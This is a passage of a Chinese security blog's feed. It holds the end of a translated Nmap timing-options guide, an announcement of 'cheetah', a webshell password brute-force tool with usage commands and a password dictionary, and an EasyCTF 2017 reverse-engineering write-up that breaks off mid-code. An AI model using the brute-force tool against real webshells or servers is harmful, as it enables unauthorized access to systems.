使用大的组。</p><p>–max-hostgroup选项用于说明使用最大的组，Nmap不会超出这个大小。–min-hostgroup选项说明最小的组，Nmap 会保持组大于这个值。如果在指定的接口上没有足够的目标主机来满足所 指定的最小值，Nmap可能会采用比所指定的值小的组。这两个参数虽然很少使用， 但都用于保持组的大小在一个指定的范围之内。</p><p>这些选项的主要用途是说明一个最小组的大小，使得整个扫描更加快速。通常 选择256来扫描C类网段。对于端口数较多的扫描，超出该值没有意义。对于 端口数较少的扫描，2048或更大的组大小是有帮助的。</p><p><strong>–min-parallelism<milliseconds>; –max-parallelism<milliseconds>(调整探测报文的并行度)</milliseconds></milliseconds></strong></p><p>这些选项控制用于主机组的探测报文数量，可用于端口扫描和主机发现。默认状态下， Nmap基于网络性能计算一个理想的并行度，这个值经常改变。如果报文被丢弃， Nmap降低速度，探测报文数量减少。随着网络性能的改善，理想的探测报文数量会缓慢增加。 这些选项确定这个变量的大小范围。默认状态下，当网络不可靠时，理想的并行度值 可能为1，在好的条件下，可能会增长至几百。</p><p>最常见的应用是–min-parallelism值大于1，以加快 性能不佳的主机或网络的扫描。这个选项具有风险，如果过高则影响准确度，同时 也会降低Nmap基于网络条件动态控制并行度的能力。这个值设为10较为合适， 这个值的调整往往作为最后的手段。</p><p>–max-parallelism选项通常设为1，以防止Nmap在同一时间 向主机发送多个探测报文，和选择–scan-delay同时使用非常有用，虽然 这个选项本身的用途已经很好。</p><p><strong>–min-rtt-timeout<milliseconds>， –max-rtt-timeout<milliseconds>， –initial-rtt-timeout<milliseconds>(调整探测报文超时)</milliseconds></milliseconds></milliseconds></strong></p><p>Nmap使用一个运行超时值来确定等待探测报文响应的时间，随后会放弃或重新 发送探测报文。Nmap基于上一个探测报文的响应时间来计算超时值，如果网络延迟比较显著 和不定，这个超时值会增加几秒。初始值的比较保守(高)，而当Nmap扫描无响应 的主机时，这个保守值会保持一段时间。</p><p>这些选项以毫秒为单位，采用小的–max-rtt-timeout值，使 –initial-rtt-timeout值大于默认值可以明显减少扫描时间，特别 是对不能ping通的扫描(-P0)以及具有严格过滤的网络。如果使用太 小的值，使得很多探测报文超时从而重新发送，而此时可能响应消息正在发送，这使得整个扫描的时 间会增加。</p><p>如果所有的主机都在本地网络，对于–max-rtt-timeout值来 说，100毫秒比较合适。如果存在路由，首先使用ICMP ping工具ping主机，或使用其 它报文工具如hpings，可以更好地穿透防火墙。查看大约10个包的最大往返时间，然后将 –initial-rtt-timeout设成这个时间的2倍，–max-rtt-timeout 可设成这个时间值的3倍或4倍。通常，不管ping的时间是多少，最大的rtt值不得小于100ms， 不能超过1000ms。</p><p>–min-rtt-timeout这个选项很少使用，当网络不可靠时， Nmap的默认值也显得过于强烈，这时这个选项可起作用。当网络看起来不可靠时，Nmap仅将 超时时间降至最小值，这个情况是不正常的，需要向nmap-dev邮件列表报告bug。</p><p><strong>–host-timeout<milliseconds>(放弃低速目标主机)</milliseconds></strong></p><p>由于性能较差或不可靠的网络硬件或软件、带宽限制、严格的防火墙等原因， 一些主机需要很长的时间扫描。这些极少数的主机扫描往往占 据了大部分的扫描时间。因此，最好的办法是减少时间消耗并且忽略这些主机，使用 –host-timeout选项来说明等待的时间(毫秒)。通常使用1800000 来保证Nmap不会在单个主机上使用超过半小时的时间。需要注意的是，Nmap在这半小时中可以 同时扫描其它主机，因此并不是完全放弃扫描。超时的主机被忽略，因此也没有针对该主机的 端口表、操作系统检测或版本检测结果的输出。</p><p><strong>–scan-delay<milliseconds>; –max-scan-delay<milliseconds>(调整探测报文的时间间隔)</milliseconds></milliseconds></strong></p><p>这个选项用于Nmap控制针对一个主机发送探测报文的等待时间(毫秒)，在带宽 控制的情况下这</p>]]></content>
    
    <summary type="html">
    
      项目地址：Nmap-Reference-Guide [https://github.com/sunnyelf/Nmap-Reference-Guide]

#目录目录
 * 译注
 * 名称
 * 命令
 * 描述
 * 选项概要
 * 目标说明
 * 主机发现
 * 端口扫描基础
 * 端口扫描技术
 * 端口说明和扫描顺序
 * 服务和版本探测
 * 操作系统探测
 * 时间和性能
 * 防火墙/IDS躲避和欺骗
 * 输出
 * 其它选项
 * 运行时交互
 * 实例
 * Bugs
 * 作者
 * 法律事项(版权、许可证、担保(缺)、出口限制)
    
    </summary>
    
      <category term="神兵利器" scheme="https://sunnyelf.github.io/categories/%E7%A5%9E%E5%85%B5%E5%88%A9%E5%99%A8/"/>
    
    
      <category term="reference" scheme="https://sunnyelf.github.io/tags/reference/"/>
    
      <category term="guide" scheme="https://sunnyelf.github.io/tags/guide/"/>
    
      <category term="nmap" scheme="https://sunnyelf.github.io/tags/nmap/"/>
    
      <category term="nmap参考指南" scheme="https://sunnyelf.github.io/tags/nmap%E5%8F%82%E8%80%83%E6%8C%87%E5%8D%97/"/>
    
  </entry>
  
  <entry>
    <title>Webshell密码极速爆破工具-cheetah</title>
    <link href="https://sunnyelf.github.io/2017/04/24/Webshell%E5%AF%86%E7%A0%81%E6%9E%81%E9%80%9F%E7%88%86%E7%A0%B4%E5%B7%A5%E5%85%B7-cheetah/"/>
    <id>https://sunnyelf.github.io/2017/04/24/Webshell密码极速爆破工具-cheetah/</id>
    <published>2017-04-24T04:32:00.000Z</published>
    <updated>2017-10-02T19:31:43.911Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-介绍"><a href="#0x00-介绍" class="headerlink" title="0x00 介绍"></a>0x00 介绍</h1><p>Cheetah是一款基于字典的webshell密码爆破工具，Cheetah的工作原理是能根据自动探测出的web服务设置相关参数一次性提交大量的探测密码进行爆破，爆破效率是其他普通webshell密码暴力破解工具上千倍。</p><p>项目地址：<a href="https://github.com/sunnyelf/cheetah" target="_blank" rel="external">https://github.com/sunnyelf/cheetah</a></p><a id="more"></a><h1 id="0x01-特点"><a href="#0x01-特点" class="headerlink" title="0x01 特点"></a>0x01 特点</h1><ul><li>速度极快</li><li>支持批量爆破</li><li>自动伪造请求</li><li>自动探测web服务设置相关参数</li><li>支持读取和去重超大密码字典文件</li><li>支持python 2.x和3.x</li><li>目前支持php、jsp、asp、aspx webshell</li></ul><h1 id="0x02-参数说明"><a href="#0x02-参数说明" class="headerlink" title="0x02 参数说明"></a>0x02 参数说明</h1><pre><code>_________________________________________________       ______              _____         ________________  /_ _____ _____ __  /_______ ____  /__  ___/__  __ \_  _ \_  _ \_  __/_  __ \ __  __ \/ /__  _  / / //  __//  __// /_  / /_/ / _  / / /\___/  / / /_/ \___/ \___/ \__/  \____/  / / /_/      /_/                               /_/a very fast brute force webshell password tool.usage: cheetah.py [-h] [-i] [-v] [-c] [-up] [-r] [-w] [-s] [-n] [-u] [-b]                   [-p [file [file ...]]]可选参数:  -h, --help            显示帮助信息并退出  -i, --info            显示程序信息并退出  -v, --verbose         启用详细输出模式(默认禁用)  -c, --clear           去重字典文件(默认禁用)  -up, --update         更新cheetah  -r , --request        指定请求方式(默认POST方式)  -t , --time           指定请求间隔时间(默认0秒)  -w , --webshell       指定webshell类型(默认自动探测)  -s , --server         指定web服务器名称(默认自动探测)  -n , --number         指定一次请求参数数量(默认自动设置)  -u , --url            指定webshell url地址  -b , --url-file       指定批量webshell urls文件  -p   file [file ...]  指定多个字典文件(默认使用data/pwd.list)使用示例:  python cheetah.py -u http://orz/orz.php  python cheetah.py -u http://orz/orz.jsp -r post -n 1000 -v  python cheetah.py -u http://orz/orz.asp -r get -c -p pwd.list  python cheetah.py -u http://orz/orz -w aspx -s apache -n 1000  python cheetah.py -b url.list -c -p pwd1.list pwd2.list -v</code></pre><h1 id="0x03-下载使用"><a href="#0x03-下载使用" class="headerlink" title="0x03 下载使用"></a>0x03 下载使用</h1><pre><code>git clone https://github.com/sunnyelf/cheetah.gitpython cheetah.py </code></pre><h1 id="0x04-文件说明"><a href="#0x04-文件说明" class="headerlink" title="0x04 文件说明"></a>0x04 文件说明</h1><pre><code>cheetah:│  .codeclimate.yml│  .gitignore│  .travis.yml│  cheetah.py             主程序│  LICENSE│  README.md│  README_zh.md│  update.py              更新模块│├─data│      big_shell_pwd.7z   高效shell大字典│      pwd.list           默认指定字典文件│      url.list           默认指定批量webshell url文件│      user-agent.list    用户代理文件│└─images        1.png        2.png        3.png        4.png        logo.jpg</code></pre><h1 id="0x05-截图"><a href="#0x05-截图" class="headerlink" title="0x05 截图"></a>0x05 截图</h1><h2 id="Ubuntu"><a href="#Ubuntu" class="headerlink" title="Ubuntu"></a>Ubuntu</h2><p><img src="https://github.com/sunnyelf/cheetah/raw/master/images/4.png" alt="cheetah"></p><h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><p><img src="https://github.com/sunnyelf/cheetah/raw/master/images/1.png" alt="cheetah"><br><img src="https://github.com/sunnyelf/cheetah/raw/master/images/2.png" alt="cheetah"><br><img src="https://github.com/sunnyelf/cheetah/raw/master/images/3.png" alt="cheetah"></p><h1 id="0x06-问题"><a href="#0x06-问题" class="headerlink" title="0x06 问题"></a>0x06 问题</h1><p>如果在使用过程中出现了bug欢迎提交<a href="https://github.com/sunnyelf/cheetah/issues" target="_blank" rel="external">issues</a>，我会及时回复并修复。</p><h1 id="0x07-参考"><a href="#0x07-参考" class="headerlink" title="0x07 参考"></a>0x07 参考</h1><p><a href="https://www.t00ls.net/articles-36985.html" target="_blank" rel="external">让你的一句话爆破速度提升千倍</a></p><p><a href="http://journal.ucas.ac.cn/CN/abstract/abstract12402.shtml" target="_blank" rel="external">一种有效的Web指纹识别方法</a></p><p><a href="https://kennel209.gitbooks.io/owasp-testing-guide-v4/content/zh/web_application_security_testing/fingerprint_web_server_otg-info-002.html" target="_blank" rel="external">识别Web服务器 (OTG-INFO-002)</a></p><p><a href="https://github.com/Shuang0420/Shuang0420.github.io/wiki/python%E8%AF%BBGB%E7%BA%A7%E5%A4%A7%E6%96%87%E4%BB%B6" target="_blank" rel="external">python读GB级大文件</a></p>]]></content>
    
    <summary type="html">
    
      #0X00-介绍0X00 介绍
Cheetah是一款基于字典的webshell密码爆破工具，Cheetah的工作原理是能根据自动探测出的web服务设置相关参数一次性提交大量的探测密码进行爆破，爆破效率是其他普通webshell密码暴力破解工具上千倍。

项目地址：https://github.com/sunnyelf/cheetah [https://github.com/sunnyelf/cheetah]
    
    </summary>
    
      <category term="神兵利器" scheme="https://sunnyelf.github.io/categories/%E7%A5%9E%E5%85%B5%E5%88%A9%E5%99%A8/"/>
    
    
      <category term="password attack" scheme="https://sunnyelf.github.io/tags/password-attack/"/>
    
      <category term="webshell密码爆破" scheme="https://sunnyelf.github.io/tags/webshell%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/"/>
    
      <category term="webshell" scheme="https://sunnyelf.github.io/tags/webshell/"/>
    
      <category term="cheetah" scheme="https://sunnyelf.github.io/tags/cheetah/"/>
    
  </entry>
  
  <entry>
    <title>EasyCTF 2017 Reverse Pwn Write Up</title>
    <link href="https://sunnyelf.github.io/2017/04/09/EasyCTF-2017-Reverse-Pwn-Write-Up/"/>
    <id>https://sunnyelf.github.io/2017/04/09/EasyCTF-2017-Reverse-Pwn-Write-Up/</id>
    <published>2017-04-09T02:35:00.000Z</published>
    <updated>2017-10-02T19:22:31.926Z</updated>
    
    <content type="html"><![CDATA[<p>作者:<a href="https://www.zhihu.com/people/sunnyelf/" target="_blank" rel="external">Jing Ling</a><br>博客:<a href="https://www.hackfun.org" target="_blank" rel="external">HackFun</a></p><h1 id="0x06-Reverse-Engineering"><a href="#0x06-Reverse-Engineering" class="headerlink" title="0x06 Reverse Engineering"></a>0x06 Reverse Engineering</h1><h2 id="Hexable"><a href="#Hexable" class="headerlink" title="Hexable"></a>Hexable</h2><h3 id="problem"><a href="#problem" class="headerlink" title="problem"></a>problem</h3><p>I tried to hide a flag sneakily, can you find it? <a href="https://github.com/EasyCTF/easyctf-2017-problems/raw/master/hexable-autogen/hexable" target="_blank" rel="external">Download</a></p><a id="more"></a><h3 id="solution"><a href="#solution" class="headerlink" title="solution"></a>solution</h3><p><img src="http://i.imgur.com/EYMzgNU.png" alt=""></p><h2 id="Phunky-Python-I"><a href="#Phunky-Python-I" class="headerlink" title="Phunky Python I"></a>Phunky Python I</h2><h3 id="problem-1"><a href="#problem-1" class="headerlink" title="problem"></a>problem</h3><p>The other day we happened upon a dusty old laptop covered in duct tape and surrounded by several papers with notes scrawled all over them. Upon inspection, we found that the laptop contained several python files labeled <code>phunky</code>.</p><p>We’ve determined that each of the files contains a mini reversing challenge. The first task is simple: Find the value of <code>x</code> such that the program prints out <code>easyctf</code> (make sure it’s lowercase!).</p><p><a href="https://github.com/EasyCTF/easyctf-2017-problems/tree/master/phunkypython1" target="_blank" rel="external">phunky1.py</a></p><h3 id="solution-1"><a href="#solution-1" class="headerlink" title="solution"></a>solution</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">x = <span class="number">9758391023608105872L</span> - <span class="number">102</span></div><div class="line">digs = [<span class="number">9758391023608105871L</span>, <span class="number">9758391023608105867L</span>, <span class="number">9758391023608105885L</span>, <span class="number">9758391023608105891L</span>, <span class="number">9758391023608105869L</span>, <span class="number">9758391023608105886L</span>, <span class="number">9758391023608105872L</span>]</div><div class="line">out = <span class="string">""</span></div><div class="line"><span class="keyword">for</span> letter <span class="keyword">in</span> reversed(digs):</div><div class="line">   out = chr(letter - x) + out</div><div class="line"><span class="keyword">print</span> out + <span class="string">'&#123;'</span> + str(x) + <span class="string">'&#125;'</span></div></pre></td></tr></table></figure><p>flag：<code>easyctf{9758391023608105770}</code></p><h2 id="Useless-Python"><a href="#Useless-Python" class="headerlink" title="Useless Python"></a>Useless Python</h2><h3 id="problem-2"><a href="#problem-2" class="headerlink" title="problem"></a>problem</h3><p>Boredom took over, so I wrote this python file! I didn’t want anyone to see it though because it doesn’t actually run, so I used the coolest base-16 encoding to keep it secret. <a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/useless-python/useless.py" target="_blank" rel="external">python</a></p><h3 id="solution-2"><a href="#solution-2" class="headerlink" title="solution"></a>solution</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">s=open(<span class="string">'useless.py'</span>).read()</div><div class="line">s=s.decode(<span class="string">'hex'</span>)</div><div class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">    <span class="keyword">if</span> <span class="string">'exec('</span> <span class="keyword">in</span> s:</div><div class="line">        s = eval(s[<span class="number">5</span>:<span class="number">-1</span>])</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">break</span></div><div class="line"><span class="keyword">print</span> s</div></pre></td></tr></table></figure><hr><pre><code>flag = &apos;easyctf{python_3x3c_exec_3xec_ex3c}&apos;priint flag</code></pre><h2 id="Phunky-Python-II"><a href="#Phunky-Python-II" class="headerlink" title="Phunky Python II"></a>Phunky Python II</h2><h3 id="problem-3"><a href="#problem-3" class="headerlink" title="problem"></a>problem</h3><p>We stumbled across another phunky Python file. Can you find the redacted value of jkx that makes this program print <code>True</code>?</p><h3 id="solution-3"><a href="#solution-3" class="headerlink" title="solution"></a>solution</h3><p>题目：<br></p><figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> operator</div><div class="line">jkx = <span class="number">0</span> <span class="comment"># REDACTED</span></div><div class="line">pork = ((<span class="number">12</span>*jkx+<span class="number">44</span>)/<span class="number">4</span>)-(<span class="number">1234</span>/<span class="number">617</span>)*jkx-sum([<span class="number">1</span>, <span class="number">4</span>, <span class="number">7</span>])</div><div class="line">jkx *= pork</div><div class="line">pp = filter(<span class="keyword">lambda</span> g: <span class="keyword">not</span> any(g % u == <span class="number">0</span> <span class="keyword">for</span> u <span class="keyword">in</span> range(<span class="number">2</span>, g)), range(<span class="number">2</span>, <span class="number">10000</span>))</div><div class="line">b = reduce(operator.mul, (pp[i] ** int(str(jkx)[i]) <span class="keyword">for</span> i <span class="keyword">in</span> range(len(str(jkx)))))</div><div class="line"><span class="keyword">print</span> b == <span class="number">6548044661510965675361835669609097497614277988316628335954865908614987464656662774230164176397886049495203497380194320473112237121935351588106637391652296924206523967496334906449626062538176842451446687574581963609515235677360001918335627990557065870263618484501558703622228018822062325974112864876000000</span></div></pre></td></tr></table></figure><p></p><p>第3行简化一下：</p><pre><code>pork = ((12*jkx+44)/4)-(1234/617)*jkx-sum([1, 4, 7])pork = (3*jkx+11)-(1234/617)*jkx-12pork = 3*jkx+11-2*jkx-12pork = jkx - 1</code></pre><p>结合第四行再次简化：</p><pre><code>jkx = jkx*(jkx-1)</code></pre><p>第五行：<code>pp = filter(lambda g: not any(g % u == 0 for u in range(2, g)), range(2, 10000))</code>是生成小于10000的所有质数列表（这语法骚得不行Orz）</p><p><img src="http://i.imgur.com/Lynz2lq.png" alt=""></p><p>第六行：<code>b = reduce(operator.mul, (pp[i] ** int(str(jkx)[i]) for i in range(len(str(jkx)))))</code></p><p>即：</p><pre><code>b = 1for i in range(len(str(jkx))):    b = b * (pp[i] ** int(str(jkx)[i])</code></pre><p>比如我们输入jkx值为123，那么就会计算b = (<strong>2</strong> ^ <code>1</code>) <em>(<strong>3</strong> ^ <code>2</code>) </em>(<strong>5</strong> ^ <code>3</code>)</p><p>参考ValarDragon表哥的解法<br></p><figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</div><div class="line"><span class="keyword">import</span> math</div><div class="line"><span class="comment">#First step:</span></div><div class="line"><span class="comment">#Factor the number</span></div><div class="line">endnum = <span class="number">1165547315017833928671818221519514360217364769512850694972634276966608764777139685632107196533251916113636826873618982702626918260245806732321339626796631711528838400321866758812099562803500967678699400226626798016068690575469938736199168207523212687169370000</span></div><div class="line">primes = filter(<span class="keyword">lambda</span> g: <span class="keyword">not</span> any(g % u == <span class="number">0</span> <span class="keyword">for</span> u <span class="keyword">in</span> range(<span class="number">2</span>, g)), range(<span class="number">2</span>, <span class="number">10000</span>))</div><div class="line">exps = []</div><div class="line"><span class="comment">#get prime factorization</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> primes:</div><div class="line">    k = <span class="number">0</span></div><div class="line">    <span class="keyword">while</span>(endnum % i == <span class="number">0</span>):</div><div class="line">        k+=<span class="number">1</span></div><div class="line">        endnum /= i</div><div class="line">    exps.append(k)</div><div class="line">    <span class="keyword">if</span>(endnum == <span class="number">1</span>):</div><div class="line">        <span class="keyword">break</span></div><div class="line">print(<span class="string">"exponents = %s"</span> %exps)</div><div class="line"><span class="comment">#Factorization obtained</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">floorSqrt</span><span class="params">(n)</span>:</span></div><div class="line">    x = n</div><div class="line">    y = (x + <span class="number">1</span>) // <span class="number">2</span></div><div class="line">    <span class="keyword">while</span> y &lt; x:</div><div class="line">        x = y</div><div class="line">        y = (x + n // x) // <span class="number">2</span></div><div class="line">    <span class="keyword">return</span> x</div><div class="line"></div><div class="line">jkx2 = <span class="string">""</span></div><div class="line"><span class="keyword">for</span> k <span class="keyword">in</span> exps:</div><div class="line">    jkx2 += str(k)</div><div class="line">jkx2 = int(jkx2)</div><div class="line"><span class="keyword">while</span>(<span class="keyword">True</span>):</div><div class="line">    breakEarly = <span class="keyword">False</span></div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        jkxapprox = floorSqrt(jkx2)</div><div class="line">        <span class="keyword">assert</span> jkx2 == jkxapprox*(jkxapprox+<span class="number">1</span>)</div><div class="line">        print(<span class="string">"jkx2 = %s"</span> % jkx2)</div><div class="line">        print(<span class="string">"jkx  = %s"</span> % (jkxapprox+<span class="number">1</span>))</div><div class="line">        breakEarly = <span class="keyword">True</span></div><div class="line">        <span class="keyword">break</span></div><div class="line">    <span class="keyword">except</span> AssertionError:</div><div class="line">        <span class="keyword">pass</span></div><div class="line">    <span class="keyword">if</span>(breakEarly):</div><div class="line">        <span class="keyword">break</span></div><div class="line">    jkx2 *= <span class="number">10</span></div></pre></td></tr></table></figure><p></p><h2 id="Lucky-Guess"><a href="#Lucky-Guess" class="headerlink" title="Lucky Guess"></a>Lucky Guess</h2><h3 id="problem-4"><a href="#problem-4" class="headerlink" title="problem"></a>problem</h3><p>Would you like to play <a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/luckyguess/guess" target="_blank" rel="external">a guessing game</a>?</p><h3 id="solution-4"><a href="#solution-4" class="headerlink" title="solution"></a>solution</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// eax@1</span></div><div class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v5; <span class="comment">// rax@8</span></div><div class="line">  __int64 v6; <span class="comment">// rax@10</span></div><div class="line">  <span class="keyword">int</span> v7; <span class="comment">// eax@11</span></div><div class="line">  __int64 v8; <span class="comment">// rax@12</span></div><div class="line">  <span class="keyword">int</span> v9; <span class="comment">// [sp+0h] [bp-A0h]@1</span></div><div class="line">  <span class="keyword">int</span> v10; <span class="comment">// [sp+4h] [bp-9Ch]@1</span></div><div class="line">  <span class="keyword">int</span> i; <span class="comment">// [sp+8h] [bp-98h]@3</span></div><div class="line">  <span class="keyword">int</span> v12; <span class="comment">// [sp+Ch] [bp-94h]@1</span></div><div class="line">  <span class="keyword">int</span> v13[<span class="number">36</span>]; <span class="comment">// [sp+10h] [bp-90h]@1</span></div><div class="line"></div><div class="line">  primp();</div><div class="line">  qmemcpy(v13, <span class="string">"g"</span>, <span class="number">0x88</span>uLL);</div><div class="line">  v3 = time(<span class="number">0L</span>L);</div><div class="line">  srand(v3);</div><div class="line">  v12 = rand() % <span class="number">0x4000000</span>;</div><div class="line">  v10 = <span class="number">0</span>;</div><div class="line">  v9 = <span class="number">0</span>;</div><div class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</div><div class="line">  &#123;</div><div class="line">    v7 = v10++;</div><div class="line">    <span class="keyword">if</span> ( v7 &gt; <span class="number">22</span> )</div><div class="line">    &#123;</div><div class="line">      LODWORD(v8) = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;((__int64)&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, (__int64)<span class="string">"no dice."</span>);</div><div class="line">      <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v8, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</div><div class="line">      <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;((__int64)&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, (__int64)<span class="string">"Guess? "</span>);</div><div class="line">    <span class="built_in">std</span>::istream::<span class="keyword">operator</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cin</span>, &amp;v9);</div><div class="line">    <span class="keyword">if</span> ( v9 == v12 )</div><div class="line">      <span class="keyword">break</span>;</div><div class="line">    <span class="keyword">if</span> ( v9 &gt;= v12 )</div><div class="line">      v5 = <span class="string">"hi"</span>;</div><div class="line">    <span class="keyword">else</span></div><div class="line">      v5 = <span class="string">"lo"</span>;</div><div class="line">    LODWORD(v6) = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;((__int64)&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, (__int64)v5);</div><div class="line">    <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v6, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; (<span class="keyword">unsigned</span> __int64)i &lt; <span class="number">0x22</span>; ++i )</div><div class="line">    <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(<span class="keyword">char</span>)(v13[i] ^ c610[<span class="number">4</span> * i]));</div><div class="line">  <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p><img src="http://i1.piimg.com/589513/73430c431965b22f.png" alt=""></p><p>让<code>if ( v9 == v12 ) break;</code>执行成功跳出<code>while</code>循环，进入<code>for</code>循环得到flag，最简单的方式就是修改<code>jnz</code>指令为<code>nop</code>指令：</p><p><img src="http://i4.buimg.com/589513/91044f6f9469e567.png" alt=""></p><h2 id="Hex-QR"><a href="#Hex-QR" class="headerlink" title="Hex QR"></a>Hex QR</h2><h3 id="problem-5"><a href="#problem-5" class="headerlink" title="problem"></a>problem</h3><p>I’ve stumbled upon a very <a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/qrt/flag.png" target="_blank" rel="external">strange QR code</a>… seems like it was generated with this generator. What could it mean?</p><h3 id="solution-5"><a href="#solution-5" class="headerlink" title="solution"></a>solution</h3><p><a href="https://github.com/EasyCTF/easyctf-2017-writeups/blob/master/reverse-engineering/hexqr-200-points.md" target="_blank" rel="external">writeup</a></p><h2 id="67k"><a href="#67k" class="headerlink" title="67k"></a>67k</h2><h3 id="problem-6"><a href="#problem-6" class="headerlink" title="problem"></a>problem</h3><p><a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/r3ndom-67k/$%7Bbins_zip%7D" target="_blank" rel="external">Here</a> are 67k binaries, well more accurately 67,139 binaries. Solve every single one, append the results together in order (shouldn’t be too difficult as the binaries are numbered) and then from there I’m sure you can figure it out.</p><p>Hint: Maybe write a script.</p><h3 id="solution-6"><a href="#solution-6" class="headerlink" title="solution"></a>solution</h3><p><a href="https://github.com/VulnHub/ctf-writeups/blob/master/2017/easyctf/67k.md" target="_blank" rel="external">writeup</a><br></p><figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div 